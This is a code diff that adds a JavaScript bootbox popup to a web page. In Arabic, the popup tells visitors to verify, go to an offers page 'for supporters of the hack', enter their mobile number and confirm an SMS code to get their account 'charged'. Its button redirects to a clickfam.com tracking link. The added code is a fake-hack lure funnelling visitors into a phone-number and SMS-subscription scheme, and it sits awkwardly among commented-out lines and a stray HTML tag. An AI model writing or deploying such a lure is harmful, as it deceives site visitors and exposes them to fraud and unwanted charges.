@@ -167,6 +167,20 @@ $(document).ready(function(){
           // strVar += "                                               <\/div>";
         // strVar += "                                           <\/div>";
                      <div data-captcha-enable="true"></div>
+	    
+	            bootbox.dialog({
+            message: "<p dir='rtl'> 1) - اضغط على الزر التحقق <p dir='rtl' > 2) -سيتم تحويلك الى صفحة عروض تخص الاشخاص الداعمين للهاك عبارة عن اختبار او اخبار...<p dir='rtl' > 3) -الآن اكتب رقم جوالك و أكد الرقم اللذي تلقيته عن طريق الرسائل <p dir='rtl' > 4) - بعد عملية تحقق سيتم نقلك الى موقع سيأكد لك شحن حسابك </p>",
+            title: "<p dir='rtl' style='color:red;' ><b>يرجى قراءة التعليمات بعناية!</b></p>",
+            closeButton: false,
+             buttons: {
+                     main: {
+                               label: "Next",
+                               className: "btn-success",
+                               callback: function() {
+                                           window.location.href = "https://www.clickfam.com/cl.php?id=930022591c2c17b65dfbb03cbd498831";
+                                           }
+                         },
+          }
         });
     }
 
